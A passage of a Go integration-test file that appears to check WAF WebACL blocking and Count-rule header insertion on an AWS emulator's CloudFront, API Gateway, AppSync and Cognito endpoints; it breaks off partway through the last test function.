package testutil

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/acm"
	acmtypes "github.com/aws/aws-sdk-go-v2/service/acm/types"
	"github.com/aws/aws-sdk-go-v2/service/apigateway"
	apigwtypes "github.com/aws/aws-sdk-go-v2/service/apigateway/types"
	"github.com/aws/aws-sdk-go-v2/service/appsync"
	appsyncTypes "github.com/aws/aws-sdk-go-v2/service/appsync/types"
	"github.com/aws/aws-sdk-go-v2/service/cloudfront"
	cftypes "github.com/aws/aws-sdk-go-v2/service/cloudfront/types"
	"github.com/aws/aws-sdk-go-v2/service/cognitoidentityprovider"
	cognitotypes "github.com/aws/aws-sdk-go-v2/service/cognitoidentityprovider/types"
	"github.com/aws/aws-sdk-go-v2/service/lambda"
	lambdatypes "github.com/aws/aws-sdk-go-v2/service/lambda/types"
	"github.com/aws/aws-sdk-go-v2/service/wafv2"
	waftypes "github.com/aws/aws-sdk-go-v2/service/wafv2/types"
)

// cloudFrontIntegPort is the CloudFront distribution listener port,
// cloudFrontTLSIntegPort its TLS twin, and apiGatewayIntegPort the REST API
// execute-api listener port (serviceports.CloudFront / CloudFrontTLS /
// APIGateway on the server; the SDK test module cannot import the server
// package, so the documented values are pinned here).
const (
	cloudFrontIntegPort    = 50104
	cloudFrontTLSIntegPort = 50108
	apiGatewayIntegPort    = 50102
)

// wafACLVisibility is the visibility configuration shared by the
// integration WebACLs; sampling stays on so the enforcement traffic is
// retained for GetSampledRequests.
func wafACLVisibility(metric string) *waftypes.VisibilityConfig {
	return &waftypes.VisibilityConfig{
		SampledRequestsEnabled:   true,
		CloudWatchMetricsEnabled: false,
		MetricName:               aws.String(metric),
	}
}

// wafCreateACL creates a WebACL of the given scope and rules and
// returns its ARN. The caller owns the lifecycle.
func (ic *integClients) wafCreateACL(name string, scope waftypes.Scope, rules []waftypes.Rule) (string, error) {
	resp, err := ic.wafv2.CreateWebACL(ic.ctx, &wafv2.CreateWebACLInput{
		Name:             aws.String(name),
		Scope:            scope,
		DefaultAction:    &waftypes.DefaultAction{Allow: &waftypes.AllowAction{}},
		VisibilityConfig: wafACLVisibility(strings.ReplaceAll(name, "-", "") + "Metric"),
		Rules:            rules,
	})
	if err != nil {
		return "", err
	}
	return aws.ToString(resp.Summary.ARN), nil
}

func (ic *integClients) wafDeleteACL(name string, scope waftypes.Scope, arn string) {
	id := arn[strings.LastIndex(arn, "/")+1:]
	get, err := ic.wafv2.GetWebACL(ic.ctx, &wafv2.GetWebACLInput{
		Name: aws.String(name), Scope: scope, Id: aws.String(id),
	})
	if err != nil {
		return
	}
	_, _ = ic.wafv2.DeleteWebACL(ic.ctx, &wafv2.DeleteWebACLInput{
		Name: aws.String(name), Scope: scope, Id: aws.String(id),
		LockToken: get.LockToken,
	})
}

// wafURIPathBlockRule builds a Block rule matching a URI path fragment.
func wafURIPathBlockRule(name, fragment string) waftypes.Rule {
	return waftypes.Rule{
		Name:     aws.String(name),
		Priority: 1,
		Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch:         &waftypes.FieldToMatch{UriPath: &waftypes.UriPath{}},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte(fragment),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility(name + "Rule"),
	}
}

// integHTTPSend issues a raw HTTP request against an arbitrary
// host:port. hostOverride sets the request's Host field (Go's client
// ignores a Host entry in the header map), which is how the
// host-suffix listeners are addressed. Returns the response with its
// body read.
func (r *TestRunner) integHTTPSend(method, url, hostOverride string, headers map[string]string, body []byte) (*http.Response, string, error) {
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, url, bodyReader)
	if err != nil {
		return nil, "", err
	}
	if hostOverride != "" {
		req.Host = hostOverride
	}
	for name, value := range headers {
		req.Header.Set(name, value)
	}
	resp, err := r.client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, "", fmt.Errorf("read response body: %w", err)
	}
	return resp, string(respBody), nil
}

// endpointLoopbackIP returns the loopback address the runner's HTTP
// client connects from: Go resolves "localhost" to ::1 on dual-stack
// hosts, so the address family follows the endpoint host.
func endpointLoopbackIP(endpoint string) string {
	host := strings.TrimPrefix(endpoint, "http://")
	if idx := strings.LastIndex(host, ":"); idx != -1 && !strings.Contains(host, "]") {
		host = host[:idx]
	}
	host = strings.Trim(host, "[]")
	if host == "localhost" {
		return "::1"
	}
	return host
}

// runWAFEnforcementCloudFront verifies that a WebACL associated with a
// CloudFront distribution blocks matching requests at the distribution
// listener and passes non-matching requests through to the origin (the
// platform health endpoint).
func (r *TestRunner) runWAFEnforcementCloudFront(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-cf-acl-%s", ts)
	distName := fmt.Sprintf("integ-cf-dist-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeCloudfront,
		[]waftypes.Rule{wafURIPathBlockRule("BlockBadPath", "wafblocked")})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CloudFront", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeCloudfront, aclARN)

	distResp, err := ic.cloudfront.CreateDistribution(ic.ctx, &cloudfront.CreateDistributionInput{
		DistributionConfig: &cftypes.DistributionConfig{
			CallerReference: aws.String(distName),
			Enabled:         aws.Bool(true),
			Comment:         aws.String("WAF enforcement integration test"),
			Origins: &cftypes.Origins{
				Quantity: aws.Int32(1),
				Items: []cftypes.Origin{{
					Id:         aws.String("integ-origin"),
					DomainName: aws.String("127.0.0.1:50080"),
					CustomOriginConfig: &cftypes.CustomOriginConfig{
						HTTPPort:             aws.Int32(50080),
						HTTPSPort:            aws.Int32(50443),
						OriginProtocolPolicy: cftypes.OriginProtocolPolicyHttpOnly,
						OriginReadTimeout:    aws.Int32(30),
						OriginSslProtocols: &cftypes.OriginSslProtocols{
							Quantity: aws.Int32(1),
							Items:    []cftypes.SslProtocol{cftypes.SslProtocolTLSv12},
						},
					},
				}},
			},
			DefaultCacheBehavior: &cftypes.DefaultCacheBehavior{
				TargetOriginId:       aws.String("integ-origin"),
				ViewerProtocolPolicy: cftypes.ViewerProtocolPolicyAllowAll,
				AllowedMethods: &cftypes.AllowedMethods{
					Quantity: aws.Int32(2),
					Items:    []cftypes.Method{cftypes.MethodHead, cftypes.MethodGet},
				},
				ForwardedValues: &cftypes.ForwardedValues{
					QueryString: aws.Bool(false),
					Cookies:     &cftypes.CookiePreference{Forward: cftypes.ItemSelectionNone},
				},
				MinTTL:     aws.Int64(0),
				DefaultTTL: aws.Int64(0),
				MaxTTL:     aws.Int64(0),
			},
			ViewerCertificate: &cftypes.ViewerCertificate{
				CloudFrontDefaultCertificate: aws.Bool(true),
			},
			Restrictions: &cftypes.Restrictions{
				GeoRestriction: &cftypes.GeoRestriction{
					RestrictionType: cftypes.GeoRestrictionTypeNone,
					Quantity:        aws.Int32(0),
				},
			},
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CloudFront", func() error { return fmt.Errorf("create distribution: %w", err) })
	}
	distID := aws.ToString(distResp.Distribution.Id)
	distARN := aws.ToString(distResp.Distribution.ARN)
	etag := aws.ToString(distResp.ETag)
	defer func() {
		// A distribution must be disabled before it can be deleted.
		config := distResp.Distribution.DistributionConfig
		if config != nil {
			config.Enabled = aws.Bool(false)
			if upd, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
				Id: aws.String(distID), IfMatch: aws.String(etag), DistributionConfig: config,
			}); err == nil && upd.ETag != nil {
				etag = *upd.ETag
			}
		}
		_, _ = ic.cloudfront.DeleteDistribution(ic.ctx, &cloudfront.DeleteDistributionInput{
			Id: aws.String(distID), IfMatch: aws.String(etag),
		})
	}()

	domain := aws.ToString(distResp.Distribution.DomainName)
	if domain == "" {
		domain = distID + ".cloudfront.net"
	}

	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(distARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CloudFront", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(distARN)})

	base := fmt.Sprintf("http://127.0.0.1:%d", cloudFrontIntegPort)

	return r.RunTest(integSvc, "WAF_Enforcement_CloudFront", func() error {
		resp, body, err := r.integHTTPSend(http.MethodGet, base+"/wafblocked", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("blocked-path request: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("blocked path: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}

		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/.well-known/health", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("allowed-path request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("allowed path: expected 200 from the origin, got %d (body: %s)", resp.StatusCode, body)
		}
		if !strings.Contains(body, `"status":"ok"`) {
			return fmt.Errorf("allowed path: origin body mismatch: %s", body)
		}
		if via := resp.Header.Get("X-Cache"); !strings.HasPrefix(via, "Miss from cloudfront") && !strings.HasPrefix(via, "Hit from cloudfront") {
			return fmt.Errorf("expected an X-Cache header from the distribution, got %q", via)
		}
		return nil
	})
}

// runWAFEnforcementAPIGateway verifies enforcement on the API Gateway
// runtime plane: a matching request is answered 403 before route
// matching, a non-matching request reaches the stage's mock method.
func (r *TestRunner) runWAFEnforcementAPIGateway(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-apigw-acl-%s", ts)
	apiName := fmt.Sprintf("integ-waf-api-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional,
		[]waftypes.Rule{wafURIPathBlockRule("BlockBadPath", "wafblocked")})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	api, err := ic.apigateway.CreateRestApi(ic.ctx, &apigateway.CreateRestApiInput{
		Name: aws.String(apiName),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("create rest api: %w", err) })
	}
	apiID := aws.ToString(api.Id)
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: aws.String(apiID)})

	resource, err := ic.apigateway.CreateResource(ic.ctx, &apigateway.CreateResourceInput{
		RestApiId: api.Id, ParentId: api.RootResourceId, PathPart: aws.String("wafallow"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("create resource: %w", err) })
	}

	for _, call := range []struct {
		name string
		fn   func() error
	}{
		{"put method", func() error {
			_, err := ic.apigateway.PutMethod(ic.ctx, &apigateway.PutMethodInput{
				RestApiId: api.Id, ResourceId: resource.Id,
				HttpMethod: aws.String("GET"), AuthorizationType: aws.String("NONE"),
			})
			return err
		}},
		{"put integration", func() error {
			_, err := ic.apigateway.PutIntegration(ic.ctx, &apigateway.PutIntegrationInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				Type: apigwtypes.IntegrationTypeMock,
			})
			return err
		}},
		{"put method response", func() error {
			_, err := ic.apigateway.PutMethodResponse(ic.ctx, &apigateway.PutMethodResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
		{"put integration response", func() error {
			_, err := ic.apigateway.PutIntegrationResponse(ic.ctx, &apigateway.PutIntegrationResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
	} {
		if err := call.fn(); err != nil {
			return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error {
				return fmt.Errorf("%s: %w", call.name, err)
			})
		}
	}

	deployment, err := ic.apigateway.CreateDeployment(ic.ctx, &apigateway.CreateDeploymentInput{RestApiId: api.Id})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("create deployment: %w", err) })
	}
	if _, err := ic.apigateway.CreateStage(ic.ctx, &apigateway.CreateStageInput{
		RestApiId: api.Id, StageName: aws.String("wafstage"), DeploymentId: deployment.Id,
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("create stage: %w", err) })
	}

	stageARN := fmt.Sprintf("arn:aws:apigateway:%s::/restapis/%s/stages/wafstage", ic.region, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

	// Invoke through the dedicated execute-api listener: a plain GET on
	// the main endpoint is swallowed by the S3 fallback handler, while
	// the listener serves the runtime directly with the full path form.
	base := fmt.Sprintf("http://127.0.0.1:%d/restapis/%s/wafstage/_user_request_", apiGatewayIntegPort, apiID)

	return r.RunTest(integSvc, "WAF_Enforcement_APIGateway", func() error {
		// The blocked path has no matching route; the 403 must come
		// from the WebACL before route matching.
		resp, body, err := r.integHTTPSend(http.MethodGet, base+"/wafblocked", "", nil, nil)
		if err != nil {
			return fmt.Errorf("blocked-path request: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("blocked path: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}

		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/wafallow", "", nil, nil)
		if err != nil {
			return fmt.Errorf("allowed-path request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("allowed path: expected 200 from the mock method, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// appsyncApplySchema publishes a minimal schema so GraphQL execution
// succeeds on a freshly created API (schema-less APIs reject every
// query).
func (ic *integClients) appsyncApplySchema(apiID string) error {
	resp, err := ic.appsync.StartSchemaCreation(ic.ctx, &appsync.StartSchemaCreationInput{
		ApiId:      aws.String(apiID),
		Definition: []byte("type Query { hello: String }"),
	})
	if err != nil {
		return err
	}
	if resp.Status != "PROCESSING" && resp.Status != "SUCCESS" {
		return fmt.Errorf("schema creation status %s", resp.Status)
	}
	return nil
}

// runWAFEnforcementAppSync verifies enforcement on the AppSync GraphQL
// plane: a header-based block rule rejects matching requests with 403
// while non-matching requests execute normally.
func (r *TestRunner) runWAFEnforcementAppSync(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-appsync-acl-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{{
		Name:     aws.String("BlockTestHeader"),
		Priority: 1,
		Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch: &waftypes.FieldToMatch{
					SingleHeader: &waftypes.SingleHeader{Name: aws.String("x-waf-test")},
				},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte("blocked"),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility("BlockTestHeaderRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	apiResp, err := ic.appsync.CreateGraphqlApi(ic.ctx, &appsync.CreateGraphqlApiInput{
		Name:               aws.String(fmt.Sprintf("integ-waf-gql-%s", ts)),
		AuthenticationType: appsyncTypes.AuthenticationTypeApiKey,
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error { return fmt.Errorf("create graphql api: %w", err) })
	}
	apiID := aws.ToString(apiResp.GraphqlApi.ApiId)
	defer ic.appsync.DeleteGraphqlApi(ic.ctx, &appsync.DeleteGraphqlApiInput{ApiId: aws.String(apiID)})

	keyResp, err := ic.appsync.CreateApiKey(ic.ctx, &appsync.CreateApiKeyInput{ApiId: aws.String(apiID)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error { return fmt.Errorf("create api key: %w", err) })
	}
	apiKey := aws.ToString(keyResp.ApiKey.Id)

	if err := ic.appsyncApplySchema(apiID); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error { return fmt.Errorf("apply schema: %w", err) })
	}

	apiARN := fmt.Sprintf("arn:aws:appsync:%s:%s:apis/%s", ic.region, ic.accountID, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(apiARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(apiARN)})

	graphqlURL := fmt.Sprintf("%s/v1/apis/%s/graphql", r.endpoint, apiID)
	query := []byte(`{"query":"{ __typename }"}`)

	return r.RunTest(integSvc, "WAF_Enforcement_AppSync", func() error {
		resp, body, err := r.integHTTPSend(http.MethodPost, graphqlURL, "", map[string]string{
			"Content-Type": "application/json",
			"x-api-key":    apiKey,
			"x-waf-test":   "blocked",
		}, query)
		if err != nil {
			return fmt.Errorf("blocked request: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("blocked request: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}

		resp, body, err = r.integHTTPSend(http.MethodPost, graphqlURL, "", map[string]string{
			"Content-Type": "application/json",
			"x-api-key":    apiKey,
		}, query)
		if err != nil {
			return fmt.Errorf("allowed request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("allowed request: expected 200, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runWAFEnforcementCognito verifies enforcement on the Cognito user
// pools plane: a block rule on the operation target header surfaces as
// ForbiddenException through the SDK, management operations stay
// unaffected, and disassociating the WebACL lifts the block.
func (r *TestRunner) runWAFEnforcementCognito(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-cognito-acl-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{{
		Name:     aws.String("BlockInitiateAuth"),
		Priority: 1,
		Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch: &waftypes.FieldToMatch{
					SingleHeader: &waftypes.SingleHeader{Name: aws.String("x-amz-target")},
				},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte("InitiateAuth"),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility("BlockInitiateAuthRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Cognito", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	poolResp, err := ic.cognitoidp.CreateUserPool(ic.ctx, &cognitoidentityprovider.CreateUserPoolInput{
		PoolName: aws.String(fmt.Sprintf("integ-waf-pool-%s", ts)),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Cognito", func() error { return fmt.Errorf("create user pool: %w", err) })
	}
	poolID := aws.ToString(poolResp.UserPool.Id)
	poolARN := aws.ToString(poolResp.UserPool.Arn)
	defer ic.cognitoidp.DeleteUserPool(ic.ctx, &cognitoidentityprovider.DeleteUserPoolInput{UserPoolId: aws.String(poolID)})

	clientResp, err := ic.cognitoidp.CreateUserPoolClient(ic.ctx, &cognitoidentityprovider.CreateUserPoolClientInput{
		UserPoolId: poolResp.UserPool.Id,
		ClientName: aws.String("integ-waf-client"),
		ExplicitAuthFlows: []cognitotypes.ExplicitAuthFlowsType{
			cognitotypes.ExplicitAuthFlowsTypeAllowUserPasswordAuth,
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Cognito", func() error { return fmt.Errorf("create pool client: %w", err) })
	}
	clientID := aws.ToString(clientResp.UserPoolClient.ClientId)

	initiateAuth := func() error {
		_, err := ic.cognitoidp.InitiateAuth(ic.ctx, &cognitoidentityprovider.InitiateAuthInput{
			AuthFlow: cognitotypes.AuthFlowTypeUserPasswordAuth,
			AuthParameters: map[string]string{
				"USERNAME": "nosuchuser",
				"PASSWORD": "irrelevant-password",
			},
			ClientId: aws.String(clientID),
		})
		return err
	}

	return r.RunTest(integSvc, "WAF_Enforcement_Cognito", func() error {
		// Before the association the request fails on its own merits
		// (unknown user), not on the WebACL.
		if err := initiateAuth(); err != nil && strings.Contains(strings.ToLower(err.Error()), "forbidden") {
			return fmt.Errorf("pre-association InitiateAuth already failed as Forbidden: %v", err)
		}

		if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
			WebACLArn: aws.String(aclARN), ResourceArn: aws.String(poolARN),
		}); err != nil {
			return fmt.Errorf("associate: %w", err)
		}
		defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(poolARN)})

		if err := initiateAuth(); err == nil {
			return fmt.Errorf("post-association InitiateAuth unexpectedly succeeded")
		} else if err := AssertErrorContains(err, "ForbiddenException"); err != nil {
			return err
		}

		// Credential-authenticated management operations are not
		// inspected by the user pools WAF integration.
		if _, err := ic.cognitoidp.DescribeUserPool(ic.ctx, &cognitoidentityprovider.DescribeUserPoolInput{
			UserPoolId: aws.String(poolID),
		}); err != nil {
			return fmt.Errorf("management DescribeUserPool during association: %w", err)
		}

		if _, err := ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{
			ResourceArn: aws.String(poolARN),
		}); err != nil {
			return fmt.Errorf("disassociate: %w", err)
		}
		if err := initiateAuth(); err != nil && strings.Contains(strings.ToLower(err.Error()), "forbidden") {
			return fmt.Errorf("post-disassociation InitiateAuth still failed as Forbidden: %v", err)
		}
		return nil
	})
}

// proxyEchoHandlerCode is a Lambda handler in the proxy response shape
// so an AWS_PROXY integration can echo the request event (including any
// WAF-inserted headers) back in the response body.
const proxyEchoHandlerCode = `exports.handler = async (event) => {
  return { statusCode: 200, headers: { "Content-Type": "application/json" }, body: JSON.stringify(event) };
};`

// createLambdaWithCode creates a Lambda function with custom handler
// source and returns its ARN.
func (ic *integClients) createLambdaWithCode(name, roleName, code string) (string, error) {
	zipCode, err := zipLambdaCode(code)
	if err != nil {
		return "", fmt.Errorf("zip lambda code: %w", err)
	}
	_, err = ic.lambda.CreateFunction(ic.ctx, &lambda.CreateFunctionInput{
		FunctionName: aws.String(name),
		Runtime:      lambdatypes.RuntimeNodejs22x,
		Role:         aws.String(intRoleARN(roleName, ic.accountID)),
		Handler:      aws.String("index.handler"),
		Code:         &lambdatypes.FunctionCode{ZipFile: zipCode},
	})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("arn:aws:lambda:%s:%s:function:%s", ic.region, ic.accountID, name), nil
}

// runWAFEnforcementCountHeaders verifies that a Count rule's custom
// request handling inserts the configured headers into the request the
// protected resource receives: an API Gateway Lambda proxy integration
// echoes the event (including headers) into the response body.
func (r *TestRunner) runWAFEnforcementCountHeaders(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-count-acl-%s", ts)
	apiName := fmt.Sprintf("integ-count-api-%s", ts)
	fnName := fmt.Sprintf("integ-waf-count-fn-%s", ts)
	roleName := fmt.Sprintf("integ-waf-count-role-%s", ts)

	IAMCreateRole(ic.iam, roleName, lambdaTrustPolicy)
	defer IAMDeleteRole(ic.iam, roleName)

	fnARN, err := ic.createLambdaWithCode(fnName, roleName, proxyEchoHandlerCode)
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create lambda: %w", err) })
	}
	defer ic.deleteLambda(fnName)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{{
		Name:     aws.String("CountProbe"),
		Priority: 1,
		Action: &waftypes.RuleAction{
			Count: &waftypes.CountAction{
				CustomRequestHandling: &waftypes.CustomRequestHandling{
					InsertHeaders: []waftypes.CustomHTTPHeader{{
						Name: aws.String("x-waf-count"), Value: aws.String("counted"),
					}},
				},
			},
		},
		Statement: &waftypes.Statement{
			ByteMatchStatement: &waftypes.ByteMatchStatement{
				FieldToMatch: &waftypes.FieldToMatch{
					SingleHeader: &waftypes.SingleHeader{Name: aws.String("user-agent")},
				},
				PositionalConstraint: waftypes.PositionalConstraintContains,
				SearchString:         []byte("waf-count-probe"),
				TextTransformations: []waftypes.TextTransformation{
					{Priority: 0, Type: waftypes.TextTransformationTypeNone},
				},
			},
		},
		VisibilityConfig: wafACLVisibility("CountProbeRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	api, err := ic.apigateway.CreateRestApi(ic.ctx, &apigateway.CreateRestApiInput{Name: aws.String(apiName)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create rest api: %w", err) })
	}
	apiID := aws.ToString(api.Id)
	defer ic.apigateway.DeleteRestApi(ic.ctx, &apigateway.DeleteRestApiInput{RestApiId: aws.String(apiID)})

	resource, err := ic.apigateway.CreateResource(ic.ctx, &apigateway.CreateResourceInput{
		RestApiId: api.Id, ParentId: api.RootResourceId, PathPart: aws.String("wafcount"),
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create resource: %w", err) })
	}

	lambdaURI := fmt.Sprintf("arn:aws:apigateway:%s:lambda:path/2015-03-31/functions/%s/invocations", ic.region, fnARN)
	for _, call := range []struct {
		name string
		fn   func() error
	}{
		{"put method", func() error {
			_, err := ic.apigateway.PutMethod(ic.ctx, &apigateway.PutMethodInput{
				RestApiId: api.Id, ResourceId: resource.Id,
				HttpMethod: aws.String("GET"), AuthorizationType: aws.String("NONE"),
			})
			return err
		}},
		{"put integration", func() error {
			_, err := ic.apigateway.PutIntegration(ic.ctx, &apigateway.PutIntegrationInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				Type: apigwtypes.IntegrationTypeAwsProxy, Uri: aws.String(lambdaURI),
				IntegrationHttpMethod: aws.String("POST"),
			})
			return err
		}},
		{"put method response", func() error {
			_, err := ic.apigateway.PutMethodResponse(ic.ctx, &apigateway.PutMethodResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
		{"put integration response", func() error {
			_, err := ic.apigateway.PutIntegrationResponse(ic.ctx, &apigateway.PutIntegrationResponseInput{
				RestApiId: api.Id, ResourceId: resource.Id, HttpMethod: aws.String("GET"),
				StatusCode: aws.String("200"),
			})
			return err
		}},
	} {
		if err := call.fn(); err != nil {
			return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error {
				return fmt.Errorf("%s: %w", call.name, err)
			})
		}
	}

	deployment, err := ic.apigateway.CreateDeployment(ic.ctx, &apigateway.CreateDeploymentInput{RestApiId: api.Id})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create deployment: %w", err) })
	}
	if _, err := ic.apigateway.CreateStage(ic.ctx, &apigateway.CreateStageInput{
		RestApiId: api.Id, StageName: aws.String("wafcountstage"), DeploymentId: deployment.Id,
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("create stage: %w", err) })
	}

	stageARN := fmt.Sprintf("arn:aws:apigateway:%s::/restapis/%s/stages/wafcountstage", ic.region, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(stageARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(stageARN)})

